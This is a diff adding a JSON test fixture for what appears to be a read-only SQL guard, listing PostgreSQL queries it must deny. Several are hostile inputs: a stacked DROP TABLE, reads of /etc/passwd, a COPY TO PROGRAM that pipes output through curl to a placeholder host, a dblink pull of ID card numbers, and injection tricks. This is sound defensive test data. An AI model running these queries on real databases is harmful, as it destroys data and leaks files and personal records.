@@ -1,0 +1,158 @@
+[
+  {
+    "name": "wildcard on a wide table",
+    "sql": "SELECT * FROM public.member",
+    "decision": "deny",
+    "rule": "wildcard_select"
+  },
+  {
+    "name": "alias wildcard",
+    "sql": "SELECT m.* FROM public.member m",
+    "decision": "deny",
+    "rule": "wildcard_select"
+  },
+  {
+    "name": "update disguised as a lookup",
+    "sql": "UPDATE public.member SET login_name = 'x' WHERE member_id = 1",
+    "decision": "deny",
+    "rule": "statement_not_read_only"
+  },
+  {
+    "name": "stacked drop",
+    "sql": "SELECT 1; DROP TABLE public.member",
+    "decision": "deny",
+    "rule": "statement_not_read_only"
+  },
+  {
+    "name": "select into a new table",
+    "sql": "SELECT member_id INTO public.member_copy FROM public.member",
+    "decision": "deny",
+    "rule": "statement_not_read_only"
+  },
+  {
+    "name": "copy reads a file on the server",
+    "sql": "COPY public.member FROM '/etc/passwd'",
+    "decision": "deny",
+    "rule": "statement_not_read_only"
+  },
+  {
+    "name": "copy to program shells out",
+    "sql": "COPY (SELECT 1) TO PROGRAM 'curl -T - http://elsewhere'",
+    "decision": "deny",
+    "rule": "statement_not_read_only"
+  },
+  {
+    "name": "an anonymous code block",
+    "sql": "DO $$ BEGIN PERFORM 1; END $$",
+    "decision": "deny",
+    "rule": "statement_not_read_only"
+  },
+  {
+    "name": "calling the fixture procedure",
+    "sql": "CALL public.sp_member_bets(1)",
+    "decision": "deny",
+    "rule": "statement_not_read_only"
+  },
+  {
+    "name": "reading a server file by function",
+    "sql": "SELECT pg_read_file('/etc/passwd')",
+    "decision": "deny",
+    "rule": "statement_not_read_only"
+  },
+  {
+    "name": "listing a server directory",
+    "sql": "SELECT pg_ls_dir('/')",
+    "decision": "deny",
+    "rule": "statement_not_read_only"
+  },
+  {
+    "name": "sleeping to hold a snapshot open",
+    "sql": "SELECT pg_sleep(3600)",
+    "decision": "deny",
+    "rule": "statement_not_read_only"
+  },
+  {
+    "name": "probing the catalogue",
+    "sql": "SELECT relname FROM pg_catalog.pg_class",
+    "decision": "deny",
+    "rule": "statement_not_read_only"
+  },
+  {
+    "name": "writing a large object to disk",
+    "sql": "SELECT lo_export(16385, '/tmp/leak')",
+    "decision": "deny",
+    "rule": "statement_not_read_only"
+  },
+  {
+    "name": "reaching another host",
+    "sql": "SELECT dblink('dbname=other', 'SELECT id_card_number FROM public.member')",
+    "decision": "deny",
+    "rule": "statement_not_read_only"
+  },
+  {
+    "name": "executing sql handed over as text",
+    "sql": "SELECT query_to_xml('SELECT id_card_number FROM public.member', true, false, '')",
+    "decision": "deny",
+    "rule": "statement_not_read_only"
+  },
+  {
+    "name": "a row locking clause takes locks",
+    "sql": "SELECT member_id FROM public.member FOR UPDATE",
+    "decision": "deny",
+    "rule": "statement_not_read_only"
+  },
+  {
+    "name": "for share locks too",
+    "sql": "SELECT member_id FROM public.member FOR SHARE",
+    "decision": "deny",
+    "rule": "statement_not_read_only"
+  },
+  {
+    "name": "explicit table lock",
+    "sql": "LOCK TABLE public.member IN ACCESS EXCLUSIVE MODE",
+    "decision": "deny",
+    "rule": "statement_not_read_only"
+  },
+  {
+    "name": "changing a session setting",
+    "sql": "SET statement_timeout = 0",
+    "decision": "deny",
+    "rule": "statement_not_read_only"
+  },
+  {
+    "name": "an unbound parameter placeholder",
+    "sql": "SELECT member_id FROM public.member WHERE member_id = $1",
+    "decision": "deny",
+    "rule": "statement_not_read_only"
+  },
+  {
+    "name": "unterminated literal",
+    "sql": "SELECT login_name FROM public.member WHERE login_name = 'abc",
+    "decision": "deny",
+    "rule": "parse_failed"
+  },
+  {
+    "name": "unterminated dollar quote",
+    "sql": "SELECT login_name FROM public.member WHERE login_name = $tag$abc",
+    "decision": "deny",
+    "rule": "parse_failed"
+  },
+  {
+    "name": "a backslash whose meaning depends on a server setting",
+    "sql": "SELECT login_name FROM public.member WHERE login_name = 'a\\b'",
+    "decision": "deny",
+    "rule": "parse_failed"
+  },
+  {
+    "name": "a dollar sign touching an identifier",
+    "sql": "SELECT a$$ FROM public.member; DROP TABLE public.member --$$",
+    "decision": "deny",
+    "rule": "parse_failed"
+  },
+  {
+    "name": "unmodelled operator",
+    "sql": "SELECT member_id \\ 1 FROM public.member",
+    "decision": "deny",
+    "rule": "unsupported_syntax"
+  }
+]
